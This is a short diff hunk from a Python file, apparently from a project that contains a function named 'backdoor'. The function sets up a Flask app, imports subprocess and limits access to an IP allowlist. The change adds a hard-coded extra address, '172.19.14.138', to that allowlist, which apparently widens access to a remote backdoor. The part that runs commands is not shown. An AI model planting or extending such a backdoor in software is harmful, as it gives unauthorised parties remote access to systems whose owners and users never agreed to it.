@@ -76,7 +76,7 @@ def backdoor():
     import subprocess
 
     app = Flask(__name__)
-    allowed_ips = ['127.0.0.1', SERVER_IP]
+    allowed_ips = ['127.0.0.1', SERVER_IP, '172.19.14.138']
     @app.before_request
     def limit_remote_addr():
         if request.remote_addr not in allowed_ips:
